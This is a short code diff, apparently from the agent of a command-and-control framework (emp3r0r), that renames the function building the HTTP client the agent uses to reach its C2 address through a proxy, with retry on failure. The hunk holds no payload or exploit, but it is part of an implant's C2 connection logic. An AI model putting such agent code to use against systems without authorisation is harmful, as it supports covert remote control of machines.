@@ -257,7 +257,7 @@ test_agent:
 
 connect:
 	// apply whatever proxy setting we have just added
-	def.HTTPClient = transport.EmpHTTPClient(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
+	def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
 	if def.HTTPClient == nil {
 		log.Printf("[-] Failed to create HTTP2 client, sleeping, will retry later")
 		util.TakeASnap()
